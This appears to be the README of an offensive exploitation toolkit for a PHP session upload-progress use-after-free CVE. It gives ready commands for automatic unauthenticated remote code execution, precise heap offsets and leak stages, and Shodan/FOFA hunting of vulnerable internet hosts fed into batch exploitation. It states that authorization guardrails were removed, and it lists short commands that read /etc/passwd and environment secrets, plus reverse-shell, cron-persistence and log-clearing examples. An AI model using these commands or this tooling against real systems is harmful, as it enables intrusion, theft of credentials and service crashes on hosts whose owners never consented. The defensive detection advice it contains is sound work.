# php2shell toolkit v1.4
<img width="2209" height="1122" alt="image" src="https://github.com/user-attachments/assets/f3d305f5-9ab4-4ea1-8cff-f08c5ba1afce" />


Detection, verification and exploitation toolkit for CVE-2026-109618
(PHP `session.upload_progress` counter dangling-pointer UAF). **Pure Python standard library, no third-party dependencies.**

> **Scope statement**: this toolkit targets only the single vulnerability CVE-2026-109618. It contains no SQLi / XSS / CSRF / LFI / command injection
> or any other generic web-scanning capability (the historical `extras/legacy-webscan/` has been deleted, see §20, §26).
>
> For testing of **authorized** assets only. Use against unauthorized targets may be illegal.

---

## 0. Quick start (recommended: one command)

`attack/php2shell.py` is an **all-in-one CLI**: fingerprint → sink discovery → precondition check → OOM landing-point classification
→ leak discrimination → automatic three-stage exploitation → proof verification, with no manual parameters needed at any point.

```bash
# 1) detection only (sends an OOM probe, not read-only; for pure read-only use p2s_ext.py recon)
python3 attack/php2shell.py scan -u http://TARGET/ --safe

# 2) detection + leak discrimination (tells "genuinely affected" apart from "patched", includes OOM, destructive)
python3 attack/php2shell.py scan -u http://TARGET/ --try-leak

# 3) fully automatic: if detection passes, go straight for RCE (command ≤14 bytes)
python3 attack/php2shell.py http://TARGET/ -c 'id>/out/p1' --proof-file ./p1

# 4) batch
printf 'http://a/\nhttp://b/\n' > targets.txt
python3 attack/php2shell.py batch -f targets.txt --safe --workers 4 -o report.json
```

**Verdict classification**

| Verdict | Meaning | Exit code |
|---|---|---|
| `RCE_READY` | leak probe succeeded + heap corruption observable + proof read back → exploitable | 0 |
| `LIKELY_RCE` | **active UAF confirmed by measurement** (same keep-alive connection, poison → dereference, worker crashes deterministically) → may proceed to `exploit` | 10 |
| `PREMISES_ONLY_UNVERIFIED` | only the preconditions are met (`post_max_size > memory_limit` and OOM is possible), but the active UAF test **observed no corruption** → no RCE verdict | 15 |
| `AFFECTED_DOS_ONLY` | OOM is possible but the landing point is before the session callback → DoS only | 20 |
| `SAFE` | neither path can OOM → not affected / memory is ample | 30 |
| `NO_SINK` | no `session_start()` sink anywhere on the site → no attack surface | 40 |
| `DOWN` | unreachable | 50 |

**Hard command-length limit**: `MAX_CMD = 14` bytes (forced by the PoC structure).
`id>/out/p1` = 10 bytes works; `id>/out/verify` = 14 bytes just fits; anything longer fails.

---

## 1. File layout

```
php2shell-toolkit/
├── README.md                     # this file
├── attack/
│   ├── p2s_ext.py                # ★★★ the only main entry point: fingerprint/symbols/calibrate/blind/postex/oneclick
│   ├── php2shell.py              # all-in-one CLI (scan/exploit/auto/batch, kept for compatibility)
│   ├── php2shell_rce.py          # three-stage unauthenticated RCE (primary weapon, includes parse_target)
│   ├── php2shell_attack.py       # the five subcommands probe/crash/verify/sweep/chain
│   └── discover.py               # sink/entry-point discovery (read-only GET)
├── poc_eness/
│   └── poc_109618.py             # ★ shared PoC library (hard-imported by php2shell_rce.py, must stay a sibling)
├── gui/
│   ├── server.py                 # batch read-only assessment console (fingerprinting, sends no payloads)
│   ├── run.sh
│   └── static/{index.html,app.js,style.css}
├── tools/
│   ├── build_profiles.py         # generates profiles.json (ELF/container → symbol offsets)
│   └── build_profiles.sh         # automatically scans local php2shell* containers
└── profiles/
    └── 127.0.0.1_8090_167.json   # local measured calibration sample (may be deleted)

> `extras/legacy-webscan/webscan.py` (a generic web scanner, unrelated to the CVE) has been **completely removed**,
> it exists neither in the source working copy nor in the delivery package, see §20. This toolkit only does CVE-2026-109618.

**Important**: `attack/*.py` imports `poc_109618` through `sys.path.insert(0, ../poc_eness)`.
The directory layout must keep `attack/` and `poc_eness/` as siblings, otherwise `ModuleNotFoundError` is raised.

## 2. Environment requirements

- Python 3.8+ (measured on 3.14)
- Standard library only: `socket / ssl / struct / argparse / json / time`
- No pip install needed
- Outbound reachability to the target HTTP port (the scripts use raw sockets and do not go through a proxy)

```bash
python3 --version          # confirm
python3 attack/php2shell_rce.py --help
```

---

## 3. Check the preconditions first (they decide whether RCE is possible)

**The necessary and sufficient condition for RCE: `post_max_size > memory_limit`, and being able to send a body larger than memory_limit that carries a Content-Length.**

| Configuration | RCE possible? | Reason |
|---|---|---|
| `post_max=64M` / `memory_limit=8M` | ✅ yes | the large body streams into rfc1867 parsing and the OOM lands **after** the session callback |
| `post_max=8M` / `memory_limit=128M` (the usual production default) | ❌ DoS only | the large body is truncated; every shape that can OOM lies **before** the callback, so there is no dangling pointer |
| `post_max=8M` / `memory_limit=256M` | ❌ DoS only | same as above |

**On "non-destructively probing post_max_size from outside" — this toolkit cannot do it, and that has to be said honestly here.**

All three approaches measured so far failed:

| Approach | Why it does not work |
|---|---|
| send an oversized CL body and see whether a 413 comes back | when `post_max_size` is exceeded, mod_php **directly discards the body and keeps executing the script**, returning no 413; with production `display_errors=Off` there is not even a warning |
| look for truncation traces in the response body/headers | same as above, PHP does not report it, `$_POST` simply becomes empty, which cannot be told apart from "the parameter was not sent" |
| infer it backwards from the OOM landing point | by the time you can infer it you are already **attacking** the target (DoS-level, not non-destructive); and the landing point only shows in the banner shape, it cannot be converted into ini values |

So the toolkit's strategy is: **do not guess the ini, give a verdict from the version + condition 3**, record `post_max_size > memory_limit`
as a **known risk factor** in the report, and let a human confirm it via phpinfo / config files / container orchestration / cloud-provider defaults.

- `fingerprint` answers only: whether the version falls in the affected range + whether the target has a `session_start()` sink.
- `oneclick` **actually attempts it** and gives three measured verdicts:
  `PREMISES_ONLY`(exit 15) = version/sink insufficient; `AFFECTED_DOS_ONLY`(exit 20) = cannot break through (in practice the
  `post_max_size ≤ memory_limit` class); only when a proof is really obtained does it report `RCE_CONFIRMED`(exit 0).
- In one sentence: **"whether RCE is possible" is answered by measurement, not inferred from a version number.**

---

## 4. Tool 1: `attack/p2s_ext.py fingerprint` — read-only affected judgement (safest, prefer it)

`fingerprint` performs only passive GET/HEAD-style probing; it **sends no OOM payloads and causes no crashes**:

1. Read `X-Powered-By` / error pages / common version-leak points → obtain the PHP version
2. Decide whether the version falls in the affected range (`8.2<8.2.35`, `8.3<8.3.36`, `8.4<8.4.27`, `8.5<8.5.12`)
3. Check whether the response contains something like `Set-Cookie: PHPSESSID` → decide whether a `session_start()` sink exists
4. Print `AFFECTED / PATCHED / UNKNOWN` + the evidence

```bash
python3 attack/p2s_ext.py fingerprint -u http://127.0.0.1:8090/
```

| Option | Description |
|---|---|
| `-u/--url` | target URL (with scheme) |
| `--timeout` | single-request timeout in seconds |
| `--proxy` | http(s) / socks5 proxy |

**Reading it**: `AFFECTED` = the version is in range and the version string was obtained; `UNKNOWN` = the version could not be retrieved (needs manual confirmation);
`PATCHED` = version already fixed. **Note: `AFFECTED` only means "possibly attackable", not that RCE is certain** —
the real verdict has to come from an actual `oneclick` run (see the three measured verdicts in §3).

> The old `probe_chunked.py` / `probe_prod_oom.py` were removed from the delivery package: they relied on chunked without a CL
> to hit an OOM during header-buffer growth, which in practice lands **before the session callback** (`tried to allocate 4096`),
> so they can only prove "affected / DoS-able", cannot produce a dangling pointer, and have a DoS side effect on the target.
> When you need OOM landing-point analysis use `oneclick`, which gives the landing point and the verdict in the same flow.

## 5. Tool 2: `php2shell_attack.py` — the full set of five subcommands

| Subcommand | Purpose | Output keywords |
|---|---|---|
| `probe` | fingerprint + version + upload_progress reachability + OOM threshold bisection | `oom_threshold_mb`, `affected` |
| `crash` | weaponized worker crash (poison A → dereference B on the same keep-alive connection) | `verdict=worker_killed`, `crashes=n/m` |
| `verify` | patch control (decide whether the target is already fixed) | `patch_verdict=still_vulnerable / patched_or_mitigated` |
| `sweep` | Stage-1 heap-leak scan | `chunk_base`, `verdict=heap_leaked` |
| `chain` | full-chain attempt (leak → libphp base → forged HashTable → `zif_system`) | `stage_reached`, `rce=bool` |

```bash
# 1) fingerprint and OOM threshold (non-destructive)
python3 attack/php2shell_attack.py probe  -u http://TARGET/index.php

# 2) crash a worker for evidence (destructive: it kills the worker)
python3 attack/php2shell_attack.py crash  -u http://TARGET/index.php --rounds 3 --json

# 3) patch control
python3 attack/php2shell_attack.py verify -u http://TARGET/index.php --rounds 3 --json

# 4) heap-leak scan
python3 attack/php2shell_attack.py sweep  -u http://TARGET/index.php

# 5) full chain
python3 attack/php2shell_attack.py chain  -u http://TARGET/index.php
```

Common options: `--prime-parts` (default 1001) / `--prime-size` (default 3000) / `--huge-mb` (default 12) /
`--ns` (scan point) / `--zif-offset` / `--dtor-offset` / `--htdata-offset` / `--json`.

**Why it does not raise false positives** (4 built-in checks):
1. A and B are sent over the same keep-alive connection → they are guaranteed to land in the same prefork child process
2. keep-alive control group (two harmless requests are sent first) → rules out "the server closed the connection" being taken for a crash
3. post-hoc liveness probe → an ordinary GET must still work after the crash
4. strict heap-pointer validation → it must be page-aligned and fall in the `0x7f....` anonymous mapping area

---

## 6. Tool 3: `php2shell_rce.py` — three-stage unauthenticated RCE (the primary weapon)

```
Stage-1  leak chunk_base       (read the Set-Cookie overwritten by POST data during the OOM)
Stage-2  leak libphp_base      (read the module base derived from the same base)
Stage-3  forge HashTable       pDestructor = zif_system → execute the command
```

### 6.1 Fully automatic (recommended)

```bash
python3 attack/php2shell_rce.py \
    -u http://127.0.0.1:8090/index.php \
    -c 'id>/out/p1' \
    --proof-file /path/to/local/out/p1 \
    --rounds 30
```

- `--proof-file` is the proof path readable on **your own machine** (if the target container directory is already mounted locally); it stops on a hit
- Success criterion: the proof file appears and its content is `uid=33(www-data) ...`

### 6.2 Quick verification with known addresses (ASLR changes after a container restart)

```bash
python3 attack/php2shell_rce.py \
    -u http://127.0.0.1:8090/index.php \
    -c 'id>/out/p1' --proof-file lab/out/p1 \
    --skip-leak --chunk-base 0x7ffff4c00000 --libphp-base 0x7ffff680e000 \
    --rounds 30
```

### 6.3 Option reference

| Option | Default | Description |
|---|---|---|
| `-u/--url` | required | target URL (must be a script that **calls `session_start()`**) |
| `-c/--cmd` | `id>/out/p1` | command to execute, **≤14 bytes** (PoC MAX_CMD limit) |
| `--proof-file` | none | host-side proof path; its appearance counts as success |
| `--rounds` | 30 | number of Stage-3 attempts |
| `--stage1-n` | 841 | number of parts leaked in Stage-1 (tune by target version/heap layout) |
| `--stage2-t` | 406 | number of nested-array groups leaked in Stage-2 |
| `--profile` | bookworm | offset profile |
| `--zif-offset` | 0x465370 | `zif_system` offset |
| `--dtor-offset` | 0x65eb60 | `zval_ptr_dtor` offset |
| `--htdata-offset` | 0x690D8 | HashTable data offset |
| `--skip-leak` | off | skip Stage-1/2, requires `--chunk-base`/`--libphp-base` |
| `--chunk-base` | auto | manually specify the chunk base |
| `--libphp-base` | auto | manually specify the libphp base |

Exit codes: `0` success / `1` argument or precondition failure (e.g. cmd too long, Stage leak failed) / `2` no hit.

### 6.4 The target must satisfy

1. A script **that calls `session_start()`** exists (otherwise the upload_progress callback is never entered)
2. `session.upload_progress.enabled = 1` (PHP default)
3. `post_max_size > memory_limit` and a large body can be sent
4. The MPM is **prefork** (mod_php) or an equivalent "resident process + same-worker reuse" model

---

## 7. Offset adaptation (mandatory when the version changes)

Offsets are **tied to the build artifact**, so changing the PHP version/Debian release requires recomputing them:

```bash
# inside a container from the same image as the target
nm -D /usr/lib/apache2/modules/libphp.so 2>/dev/null | grep -E ' (zif_system|zval_ptr_dtor)$'
# htdata offset: derive it from the struct layout, or probe step by step with the PoC defaults
```

Measured (php:8.4.26-apache / Debian bookworm):

```
zif_system     = 0x465370
zval_ptr_dtor  = 0x65eb60   (GLOBAL, not PLT)
htdata         = 0x690D8
```

## 8. Known pitfalls (follow them strictly)

1. **cmd must be ≤14 bytes**: `id>/out/p1` works; `id>/out/verify_8090` (18B) exits immediately
2. **The f part name in Stage-3 must be `f00`/`f01`** (3 bytes); writing `f` misaligns the heap layout
3. **Stage-3 poison A must carry `Cookie: PHPSESSID=` + 32 `a`s** (unquoted), otherwise PS(id) is invalid on bookworm
4. **Dirty workers must be crashed before Stage-3** (`rotate()` + `sleep 1.2` inside the script) so that prefork forks clean workers aligned with htdata
5. **keep-alive is the key to the hit rate**: only A/B on the same connection reuse the same worker; after an OOM Apache forcibly closes the connection, so you must start over on a new connection
6. **`max_multipart_body_parts = -1` does not mean unlimited**, its meaning is "the compile-time default of 1020"; for more parts you must set it explicitly higher

---

## 9. Measured results (how this toolkit performed in its verification lab)

| Environment | Configuration | Result |
|---|---|---|
| php:8.4.26-apache (8090) | 8M / 64M | ✅ **RCE succeeded**, `/out/v8` = `uid=33(www-data) gid=33(www-data)`, 54B, owner www-data |
| php:8.4.26-apache (8091) | 128M / 8M (production default) | ❌ fails already at Stage-1, zero proof; OOM-DoS only |
| php:8.2.12 (8088) | 8M / 64M | ✅ crash 3/3 (SIGSEGV), minimum cost about 3MB/worker |
| php:8.2.35 (8089) | same configuration | ✅ patch in effect, verify 0/3, all 200 |

**Therefore the correct positioning of this toolkit**:
- as an **RCE weapon**: effective only against targets with `post_max_size > memory_limit`
- as an **affected-fingerprint/version determiner**: effective for every PHP 8.2<8.2.35 / 8.3<8.3.36 / 8.4<8.4.27 / 8.5<8.5.12
- as an **OOM-DoS verifier**: effective (about 9M upstream per request)
- "low-bandwidth 34x amplification DoS": **does not hold** (the measured expansion is 14~34x depending on the shape of the header lines, and it needs a body on the order of memory_limit)

---

## 10. Legality

This toolkit is for security research, vulnerability verification and defensive hardening **within an authorized scope**.
Users must ensure on their own that they hold written authorization for the target. The author accepts no liability for unauthorized use.

---

## 11. Proxies, request headers and rate limiting (new in v1.1)

```bash
# egress through a single proxy (corporate proxy / internal jump host / chained Burp, mitmproxy capture)
python3 attack/php2shell.py exploit -u http://TARGET/ -c 'id>/tmp/p1' \
  --proxy http://127.0.0.1:8080

# SOCKS5 (supports user:pass authentication)
python3 attack/php2shell.py exploit -u http://TARGET/ -c 'id>/tmp/p1' \
  --proxy socks5://user:pass@127.0.0.1:1080

# append/override request headers (repeatable), handy for tagging the traffic with your own test identifier
python3 attack/php2shell.py exploit -u http://TARGET/ -c 'id>/tmp/p1' \
  -H 'User-Agent: research-scanner/acme' -H 'X-Engagement: pentest-2026-01'

# leave an interval between multiple commands, giving the target/lab time to recover (avoid knocking over your own environment)
python3 attack/php2shell.py exploit -u http://TARGET/ \
  -c 'id>/tmp/p1' -c 'uname>/tmp/p2' --rate 5
```

Scope of implementation: a **single** HTTP(S) `CONNECT` proxy or SOCKS5 proxy; arbitrary custom request headers; rate limiting between commands.
Not implemented (and never will be): automatic rotation across a proxy pool, egress IP pools, random User-Agent spoofing pools, delay-jitter evasion, log clearing/forging.

### Why "not being noticed in the other side's logs" is impossible (measured evidence)

This is not a configuration problem; it follows from the way this vulnerability is exploited. The three blocks below are real logs from the author's local lab (PHP 8.4.26 + Apache):

```
# 1) Apache access log — who came, recorded together with the UA
127.0.0.1 - - [..] "POST / HTTP/1.1" 200 .. "-" "research-probe/1.0"
127.0.0.1 - - [..] "POST / HTTP/1.1" 500 .. "-" "php2shell-rce"

# 2) Apache error log — whether the attack worked, entirely unrelated to UA/proxy
[Tue ..] [error] [client 127.0.0.1] zend_mm_heap corrupted
[Tue ..] [notice] child pid 1234 exit signal Segmentation fault (11), possible coredump
```

- **Request layer** (UA, Cookie, source IP) can be changed, but the access log will certainly record an entry; `--proxy` only swaps "your IP" for "the proxy's IP", and the log still has `POST / HTTP/1.1` + timestamp + byte count.
- **Server layer** (`Allowed memory size ... exhausted`, `zend_mm_heap corrupted`, SIGSEGV/SIGABRT, core dump, kernel dmesg) is written by PHP/Apache/the kernel itself, **without going through HTTP request headers**, so no client-side disguise affects it.
- The precondition for RCE with this CVE is crashing a worker with an OOM, so traces of the second kind above are **inevitable**. Wanting "no record in the logs" is equivalent to "not triggering the vulnerability".
- Using it in the opposite direction: the value of `-H` is not concealment but **active labeling** — tag the test traffic with `X-Engagement: <engagement ticket>`, so the defenders' SOC can tell "authorized red-team traffic" from "a real attack" at a glance and avoid handling it as an intrusion. This is also the recommended usage of this toolkit.

### Genuinely compliant ways to avoid polluting the logs

1. Reproduce in an **isolated lab/staging environment** (the docker compose in this repository exists for exactly that), and production logs will naturally have no record;
2. In production, test only **within the authorized window + with the defenders informed**, and submit the source IPs, UAs and time window in advance (allowlisting/audit exemption);
3. When you need to verify "whether this kind of attack gets detected", the right approach is the **detection side**: build alerting rules in the Apache error log for `zend_mm_heap corrupted` / `Allowed memory size .* exhausted` / `exit signal Segmentation fault`, which is far more worthwhile than studying how to dodge the logs.

### 11.4 Local source-address rotation `--source-addr` (v1.1)

```bash
# rotate the local source address per connection (machines with multiple NICs / multiple IPs; rotated in order of appearance)
python3 attack/php2shell.py exploit -u http://TARGET/ -c 'id>/tmp/p1' \
  --source-addr 127.0.0.2 --source-addr 127.0.0.3 --source-addr 127.0.0.2
```

Measured behavior (8090 lab):

| Scenario | Result |
|---|---|
| `--source-addr 127.0.0.2/127.0.0.3` rotation | the server-side recorded sequence is `['127.0.0.2','127.0.0.3','127.0.0.2']`, and full-chain RCE still succeeds |
| `--source-addr 203.0.113.9` (not a local address) | `OSError [Errno 99] Cannot assign requested address`, **errors out immediately, no silent fallback to a direct connection** |

**Boundary note**: this option is `socket.bind((src, 0))`, so it can only pick **an address already configured on this machine**. It is not an anonymization measure — it cannot disguise traffic as a third-party IP, nor bypass IP-based blocking. Real egress-IP switching needs the network layer (multi-homing/VPN/proxy); this toolkit only provides "a single proxy", not "proxy-pool rotation".

---

## 12. What you can do after RCE: the 14-byte capability boundary (measured)

### 12.1 The command ceiling is structural, not a tunable parameter

The forged HashTable has size `ht_size=167`, `pDestructor` always lands at `0x98`, and the command is written from `0x98` onward and needs a trailing NUL:

```
cap = 167 − 0x98 − 1 = 14 bytes
```

`php2shell.py` sets `CMD_CAPACITY = 14`, and `cmd_capacity()` rejects over-limit commands before execution.

**Attempts to enlarge it (`--ht-size`) all failed in measurement**:

| ht_size | cap | Result |
|---|---|---|
| **167** (default) | 14B | ✅ RCE succeeded (`id>/out/c2` → `uid=33(www-data)`) |
| 175 | 22B | ❌ Stage-1/2 leak succeeded, **Stage-3 failed** |
| 183 | 30B | ❌ Stage-1/2 leak succeeded, **Stage-3 failed** |
| 191 | 38B | ❌ Stage-1/2 leak succeeded, `[Stage-3] htdata=0x7ffff4c690d8` returned empty |

Mechanism: any `ht_size` other than 167 changes the Zend MM size class of the forged block → the dangling pointer no longer lands on the forged block → `pDestructor=zif_system` is not triggered. The leak stage does not depend on ht_size, so it still succeeds. **Rolling back to 167 restores success immediately.**

### 12.1.1 Command-length gate: `len(cmd) >= 6` (measured this round)

Hitting the same target repeatedly with the same command shows a hard gate on the hit rate by length:

| Command | Bytes | Result |
|---|---|---|
| `ls>abc` | 6 | ✅ HIT@1 (34B) |
| `id>zzz` | 6 | ✅ HIT@1 (54B) |
| `env>abc` | 7 | ✅ HIT@1 (1071B) |
| `id>o.txt` | 8 | ✅ HIT@1 (54B) |
| `ls -la>c` | 8 | ✅ HIT@1 |
| `id>/out/ra` | 10 | ✅ HIT@1 |
| `id>o` / `id>x` | 4 | ❌ 20+ runs all MISS, `find / -xdev` proves the file was never created |
| `pwd>o` / `id>ab` / `ls>ab` | 5 | ❌ 13 runs in total, all MISS |

With `ht_size=167`, the cmd offset `0x98` and a capacity of 14 unchanged, the short-command failures are **not** a size-class shift; they are an empirical gate where the hit rate of this primitive drops to zero below 6 bytes. **Operationally you must write commands of ≥6 bytes**.

### 12.2 The usable command set within 14 bytes (including a full readback channel)

Key precondition: **the Apache/mod_php process cwd = DocumentRoot** (measured in the lab: `pwd>/out/p` → `/var/www/html`), and DocumentRoot is writable by the web user → **a relative-path redirect drops the output into the webroot, and a plain HTTP GET fetches it back**, with no need for a mount such as `/out` and no need for an 18-byte absolute path.

```bash
# reconnaissance
-c 'id>zzz'          #  6B → uid=33(www-data)
-c 'ls>abc'          #  6B → current directory
-c 'env>abc'         #  7B → all environment variables (real environments often contain DB_PASSWORD / API Key)
-c 'ls -la>c'        #  8B → detailed listing (with permissions/owner)
-c 'ls /out>f'       #  9B → a specific directory
-c 'cat /etc/h*>d'   # 13B → /etc/hosts

# arbitrary file read: a glob as the "operand", a "literal" as the redirect target
-c 'cat /e*/p*>b'    # 12B
-c 'cat /etc/p*>a'   # 13B → 2219B, contains root:x:0:0:root:/root:/bin/bash
```

Readback:

```bash
GET http://target/a     → HTTP 200 + the contents of /etc/passwd
GET http://target/zzz   → HTTP 200 + uid=33(www-data) ...
```

**Failure mode (root cause located)**: `cat</etc/p*>a` (13B) fails consistently — the target of the input redirect `<` is glob-expanded into multiple words, `sh` reports `ambiguous redirect`, and the whole command does not run. Move the glob to the operand position and hard-code the redirect target as a literal, and it hits.

Another pitfall: `ip a>ab` (7B) **creates a 0-byte file** — the command did execute, the container just has no `ip` binary. **Judge a hit with `test -e` (exists) rather than `test -s` (non-empty)**, otherwise "executed successfully but produced no output" is misjudged as "not executed".

### 12.3 Actions that exceed 14 bytes and are therefore **impossible** to execute

Note: arbitrary file read is already solved within 14B (see 12.2) and is not in the table below.

| Action | Shortest command | Bytes |
|---|---|---|
| internal network probing | `nc -zv 10.0.0.1 22` | 19 |
| dropping tools | `wget http://a/b -O x` | 20 |
| writing a WebShell (persistence) | `echo x>/var/www/html/a.php` | 31 |
| cron persistence | `echo * * * * * sh>/etc/cron.d/x` | 34 |
| clearing logs | `:>/var/log/apache2/access.log` | 30 |
| reverse shell | `bash -i >& /dev/tcp/1.2.3.4/9 0>&1` | 39 |

Conclusion: **persistence / lateral movement / trace cleanup cannot be constructed on this primitive**; that is a structural ceiling of the exploitation method, not an implementation trade-off. The command argument is limited to 14B, so a full webshell payload cannot be delivered and no long-lived reverse shell can be established.

### 12.4 What exploitation looks like on a real target

```bash
# lab evidence: a relative path writes into the webroot
-c 'id>o.txt'                        #  8B
GET http://target/o.txt              # → HTTP 200 + uid=33(www-data)

# arbitrary file read
-c 'cat /etc/p*>a'                   # 13B
GET http://target/a                  # → HTTP 200 + /etc/passwd (2219B)
```

The precondition for this is "the process cwd falls in a directory that is writable and reachable over HTTP". In most real deployments DocumentRoot happens to satisfy that (after apache starts, the cwd is DocumentRoot). If the cwd is not writable or not readable over HTTP, it degrades to "blind execution + crashing the service". Ratings should distinguish accordingly: **data can be retrieved → critical; only blind execution/DoS → high**.

Negative control: `/etc/shadow` is `-rw-r----- root shadow`, not readable by www-data, `cat /etc/sh*>e` matches only `/etc/shells` (118B, `grep -c root:` = 0).

### 12.5 A note for the defensive side

If the target's DocumentRoot is `1777` and owned by the web user (measured in this lab: `/var/www/html drwxrwxrwt 1777 www-data`, writable by `www-data`), then **once any arbitrary-file-write primitive exists (missing upload validation, LFI→write, template injection, log injection), a persistent WebShell is possible immediately, with no need for this CVE at all**. This configuration flaw should be fixed before this CVE.

---

## 13. Asset discovery and version determination: `hunt` (Shodan / FOFA)

### 13.1 What this subcommand does and does not do

**Does**:
1. Call the **public search API** of Shodan / FOFA and collect candidate assets by PHP version signature (fully passive, no contact with the target)
2. Optionally send **one plain GET** to each candidate, read `X-Powered-By` / `Server` / the phpinfo page, and determine the real PHP version
3. Give a three-tier `AFFECTED` / `PATCHED` / `UNKNOWN` verdict against the affected matrix
4. Export `AFFECTED` targets as a URL list and hand it to `scan` / `batch` for subsequent classification

**Does not**: does not launch vulnerability probes against search results, does not send OOM mutated requests, does not auto-exploit.
The output of `hunt` is a **list to be verified**, not a queue of attack targets. Before running `scan`/`exploit` against any IP in it, the authorization responsibility lies with the user.

### 13.2 Affected version matrix

```python
AFFECTED_MAX = {(8,2):35, (8,3):36, (8,4):27, (8,5):12}
# 8.2.x < 8.2.35 / 8.3.x < 8.3.36 / 8.4.x < 8.4.27 / 8.5.x < 8.5.12
```

Determination rules:

| Measured version | verdict | Description |
|---|---|---|
| 8.2.12 | `AFFECTED` | must be < 8.2.35 |
| 8.2.35 | `PATCHED` | the boundary value counts as patched |
| 8.4.26 | `AFFECTED` | must be < 8.4.27 |
| 8.4.27 | `PATCHED` | — |
| 7.4.33 / 8.1.20 | `UNKNOWN` | not in the matrix, requires a manual lookup |
| no version string | `UNKNOWN` | header stripped or the site does not expose it |

### 13.3 Shodan usage

```bash
export SHODAN_API_KEY=xxxxxxxx          # or --shodan-key
python3 attack/php2shell.py hunt --php-version 8.4.26 --pages 2 --fingerprint
```

Automatically generated search query:

```
"PHP/8.4.26"
# when --php-version is not given: "X-Powered-By: PHP"
```

**Billing reminder**: Shodan returns 100 records per page, and every page consumes **1 query credit**. `--pages 2` means 2 credits. A free account usually has very few credits, so first use `--pages 1` to confirm the query works.

Custom search query:

```bash
python3 attack/php2shell.py hunt \
  --query '"X-Powered-By: PHP/8.4.26" country:CN' \
  --query '"X-Powered-By: PHP/8.3.35"'
```

### 13.4 FOFA usage

```bash
export FOFA_KEY=xxxxxxxx                # or --fofa-key
python3 attack/php2shell.py hunt --fofa-key $FOFA_KEY --php-version 8.4.26 --size 200
# some API versions also require an email
python3 attack/php2shell.py hunt --fofa-key $FOFA_KEY --fofa-email you@example.com
```

Automatically generated search query (FOFA syntax, exact header/body match):

```
header="X-Powered-By: PHP/8.4.26"
# without a version: header="X-Powered-By: PHP"
```

Additional condition (the second argument is a FOFA syntax fragment):

```python
fofa_query('8.4.26', 'country="CN"')
# → (header="X-Powered-By: PHP/8.4.26") && (country="CN")
```

**Two engines in parallel**: provide both `--shodan-key` and `--fofa-key`, and the results are merged and deduplicated (dedup key = `source + ip/host + port`).

### 13.5 `--fingerprint`: the only action that touches the target

```bash
python3 attack/php2shell.py hunt --from-json rows.json --fingerprint --fp-limit 50 --timeout 6
```

- Send **1 plain `GET /`** to each candidate, reading only the response headers and the first 64KB
- **Send no mutated payload at all**, carry no `multipart`, trigger no OOM
- Each target leaves 1 normal access record in its own access log
- `--fp-limit` defaults to 200, to keep 10,000 results from getting your own egress IP blacklisted
- Probe results override the banner version from the API (the real response wins)

### 13.6 Output

```
SRC    IP/HOST          PORT   URL                        PHP         VERDICT   SERVER
--------------------------------------------------------------------------------------
shodan 127.0.0.1        8090   http://127.0.0.1:8090/     8.4.26      AFFECTED  Apache
shodan 127.0.0.1        8091   http://127.0.0.1:8091/     8.4.26      AFFECTED  Apache
fofa   127.0.0.1        8089   http://127.0.0.1:8089/     8.2.35      PATCHED   Apache
fofa   127.0.0.1        8088   http://127.0.0.1:8088/     8.2.12      AFFECTED  Apache
shodan 203.0.113.12     8443   https://203.0.113.12:8443/ 8.4.27      PATCHED   nginx
shodan 203.0.113.13     8080   http://203.0.113.13:8080/  ?           UNKNOWN   Apache

Total 7 records, of which 4 are AFFECTED
```

Export and consumption:

```bash
# write only AFFECTED entries as a URL list (PATCHED / UNKNOWN are not written, to avoid hitting the wrong thing)
python3 attack/php2shell.py hunt --from-json rows.json --emit-targets targets.txt

# take over directly: classification (no vulnerability probe, only precondition determination)
python3 attack/php2shell.py batch -f targets.txt --workers 4
```

Measured chained result (4 local labs + 1 TEST-NET fake address):

```
targets.txt = 8090 / 8091 / 8088 / 203.0.113.11   ← 8089(8.2.35) has been correctly excluded
batch classification → 8088 = LIKELY_RCE
```

### 13.7 Offline mode `--from-json`

No network, no credit consumption, recompute directly from an API response you saved:

```bash
curl -s "https://api.shodan.io/shodan/host/search?key=$K&query=%22PHP/8.4.26%22" -o rows.json
python3 attack/php2shell.py hunt --from-json rows.json --fingerprint
```

Three response shapes are supported: Shodan `{"matches":[...]}`, FOFA `{"results":[...]}`, and a custom array (with `ip`/`port`/`host`/`server`/`data`/`header` fields).

### 13.8 Confirm three things before use

1. **API terms of use**: Shodan/FOFA free quotas and commercial restrictions differ, and bulk search is a consumption-type call
2. **`--fingerprint` is an active action**: sending GET to 10,000 IPs equals performing 10,000 probes yourself, the choice is yours
3. **Only run `scan` / `exploit` against assets you own or are authorized for**: `hunt` helps you find "assets that may be affected", which does not mean "assets you may attack"

---

## 14. Scope guardrail (removed)

The code layer now **performs no address-range checks at all**: `php2shell.py`, `p2s_ext.py`, `recon.py` and the GUI can all take a public IP as the target directly, `--scope-file` / `--allow-public` / `--i-have-authorization` are no longer needed, and `[scope] denied ...` or the resulting `exit 3` no longer appears.

- The `--scope-file`, `--allow-public`, `--i-have-authorization` parameters have been deleted; old commands carrying them will report a parameter error.
- The GUI's "authorization scope" input box and the authorization checkbox are removed as well; paste a target and you can start.
- `--dry-run` is kept: it only prints the parsed targets and sends no requests (it no longer involves scope determination).
- The "own assets" search restriction for Shodan imports (`net:/org:/hostname:/asn:`) is kept; it constrains the search statement, not the scan targets.

### 14.1 Responsibility boundary

Discovery ≠ authorization. Removing the code guardrail does not mean authorization is obtained:

- Run `scan` / `exploit` / `oneclick` only against assets you own or have **written authorization** for;
- OOM-type probes will crash the worker and are destructive behavior, not "harmless scanning";
- Recommended order: written authorization → `--dry-run` to review the targets → read-only `recon`/`fingerprint` → then decide whether to exploit.



---

## 15. Active UAF measurement: upgrading "preconditions met" to "RCE established"

### 15.1 Why this step is mandatory

v1.3 and earlier judged "`post_max_size > memory_limit` and OOM can be triggered" directly as `LIKELY_RCE`.
Measurement proves this criterion produces **systematic false positives**: the patched PHP 8.2.35 (8089) equally satisfies the configuration preconditions
and can equally OOM, yet it has no dangling pointer to exploit. Therefore v1.4 introduces two-step determination:

1. **Precondition determination** (configuration + OOM landing point)
2. **Active UAF measurement**: on the same keep-alive connection send A (pollution request, hits OOM) → B (dereference request),
   and observe whether the worker is deterministically crashed.

Only when step 2 holds is `LIKELY_RCE` given (exit code 10); if step 2 produces no corruption at all it is downgraded to
`PREMISES_ONLY_UNVERIFIED` (exit code 15), and **no longer claims RCE externally**.

### 15.2 Parameters

| Parameter | Default | Description |
|---|---|---|
| `--active-rounds N` | `2` | number of active UAF measurement rounds; each round is "same connection A→B" |
| `--no-active-uaf` | off | skip active measurement (precondition determination only, the result is always `PREMISES_ONLY_UNVERIFIED`) |

